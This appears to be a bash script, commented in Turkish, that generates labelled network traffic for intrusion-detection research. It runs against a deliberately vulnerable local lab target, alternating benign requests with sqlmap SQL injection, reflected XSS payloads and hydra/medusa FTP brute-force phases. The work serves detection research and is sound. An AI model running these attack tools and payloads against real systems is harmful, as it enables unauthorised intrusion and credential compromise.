#!/usr/bin/env bash
set -u
# NOT: bu script WSL2 (mirrored ag modu) icinden calistirilir, Windows repo yolu
# /mnt/c/... uzerinden erisilir. Hedefler (mini_vuln_target.py + pyftpdlib) ayni
# repo'daki live_fire_test/ altindan Windows tarafinda (PowerShell) baslatilir.
# R49 duzeltmesi: WSL2 mirrored-mod ($TARGET_IP) donus paketlerini (Bwd) HIC
# yakalamiyordu (loopback capture tek-yonlu kaliyordu) -- artik NAT modunda,
# gercek vEthernet(WSL) arayuzu uzerinden, host'un o arayuzdeki IP'sine
# (TARGET_IP, .wslconfig networkingMode=nat sonrasi `ip addr` ile bulunur)
# baglaniliyor. Bidirectional dogrulandi (diag_bidir2.pcap, SYN+SYN-ACK ikisi de var).
TARGET_IP="${TARGET_IP:-172.19.16.1}"
# Folder of this script (live_fire_test/), reached from WSL via /mnt/c/...
REPO_WIN="${REPO_WIN:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
WORDLIST="$REPO_WIN/wordlist.txt"
# PHASES_JSON artik WSL'in KENDI yerel dosya sisteminde (ext4, /tmp) yaziliyor,
# /mnt/c (9p/DrvFs koprusu + OneDrive senkronizasyonu + disk %97 dolu) DEGIL --
# 2026-08-20 karma-istemci kampanyasinda uzun kosumda (15 dongu, ~75 kucuk
# append) bu dosya SESSIZCE BOS kaldi (JSONDecodeError: char 0), ayni script
# kisa kosumlarda calisirken. Kok neden 9p koprusunun sik kucuk-yazma altinda
# guvenilmez olmasi -- tek cozum: calisirken YEREL yaz, sonda TEK SEFERDE kopyala.
PHASES_JSON_LOCAL="/tmp/phases_full_$$.json"
PHASES_JSON_WIN="$REPO_WIN/phases_full.json"
PHASES_JSON="$PHASES_JSON_LOCAL"
N_CYCLES="${1:-8}"

echo "[" > "$PHASES_JSON"
FIRST=1

log_phase() {
  if [ "$FIRST" -eq 0 ]; then echo "," >> "$PHASES_JSON"; fi
  FIRST=0
  printf '{"tool":"%s","dst_port":%s,"label":"%s","start":%s,"end":%s}' "$1" "$2" "$3" "$4" "$5" >> "$PHASES_JSON"
}

run_phase() {
  local tool="$1" port="$2" label="$3"; shift 3
  local t0 t1
  t0=$(date +%s.%N)
  "$@" >/dev/null 2>&1
  t1=$(date +%s.%N)
  log_phase "$tool" "$port" "$label" "$t0" "$t1"
  echo "  [cycle $CYCLE] $tool port=$port label=$label dur=$(python3 -c "print(round($t1-$t0,1))")s"
}

XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "'><svg onload=alert(1)>" "\"><iframe src=javascript:alert(1)>" "<body onload=alert(1)>")
SEARCH_TERMS=("apple" "banana" "carrot" "juice" "fruit" "smoothie" "orange" "mango")

for CYCLE in $(seq 1 "$N_CYCLES"); do
  echo "=== CYCLE $CYCLE / $N_CYCLES ==="
  # port-bucket cesitliligi: cift cycle -> standart (80/21), tek cycle -> ephemeral (3000/2121)
  if [ $((CYCLE % 2)) -eq 0 ]; then WEBP=80; FTPP=21; else WEBP=3000; FTPP=2121; fi

  # --- BENIGN: dogal aralikli, payload'siz istekler ---
  run_phase "benign_home_$CYCLE" "$WEBP" "BENIGN" bash -c "
    for i in 1 2 3 4; do
      curl -s http://$TARGET_IP:$WEBP/ -o /dev/null
      curl -s \"http://$TARGET_IP:$WEBP/rest/products/search?q=${SEARCH_TERMS[$((RANDOM % 8))]}\" -o /dev/null
      sleep 0.4
    done"
  sleep 0.5

  # --- ATTACK: sqlmap (dusuk siddet, tempo CICIDS'e yakin) ---
  run_phase "sqlmap_$CYCLE" "$WEBP" "WebAttack" timeout 45 sqlmap \
    -u "http://$TARGET_IP:$WEBP/vulnerabilities/sqli/?id=1" \
    --batch --level=1 --risk=1 --technique=BE --flush-session --delay=0.1
  sleep 0.5

  # --- ATTACK: XSS cok-istemcili (curl + python-requests), payload donguye gore degisir ---
  PAYLOAD="${XSS_PAYLOADS[$((CYCLE % 5))]}"
  run_phase "xss_$CYCLE" "$WEBP" "WebAttack" bash -c "
    enc=\$(python3 -c \"import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))\")
    for i in 1 2 3; do
      curl -s \"http://$TARGET_IP:$WEBP/vulnerabilities/xss_r/?name=\$enc\" -o /dev/null
      python3 -c \"import requests; requests.get('http://$TARGET_IP:$WEBP/vulnerabilities/xss_r/', params={'name': '''$PAYLOAD'''})\" 2>/dev/null
      sleep 0.3
    done"
  sleep 0.5

  # --- BENIGN: FTP normal (ilk denemede dogru sifre) ---
  run_phase "benign_ftp_$CYCLE" "$FTPP" "BENIGN" bash -c "
    for i in 1 2; do curl -s -m 3 \"ftp://testuser:esp32test@$TARGET_IP:$FTPP/\" -o /dev/null; sleep 0.4; done"
  sleep 0.5

  # --- ATTACK: hydra (cift cycle) / medusa (tek cycle) -- ikisi de her port bucket'ta en az bir kez gecsin ---
  if [ $((CYCLE % 2)) -eq 0 ]; then
    run_phase "hydra_$CYCLE" "$FTPP" "FTP-Patator" timeout 45 hydra -l testuser -P "$WORDLIST" -t 4 -f -V "ftp://$TARGET_IP:$FTPP"
  else
    run_phase "medusa_$CYCLE" "$FTPP" "FTP-Patator" timeout 45 medusa -h $TARGET_IP -n "$FTPP" -u testuser -P "$WORDLIST" -M ftp -t 4 -f
  fi
  sleep 1
done

echo "]" >> "$PHASES_JSON"
echo "=== TUM DONGULER TAMAMLANDI ($N_CYCLES cycle) ==="
python3 -c "import json; d=json.load(open('$PHASES_JSON')); print(len(d), 'faz yazildi')"
# Yerelde (ext4) tamamlanmis dosyayi TEK SEFERDE Windows/OneDrive tarafina kopyala --
# artik kosum boyunca /mnt/c'ye tekrar tekrar kucuk yazma YOK.
cp "$PHASES_JSON_LOCAL" "$PHASES_JSON_WIN"
rm -f "$PHASES_JSON_LOCAL"
echo "[OK] phases.json kopyalandi: $PHASES_JSON_WIN"
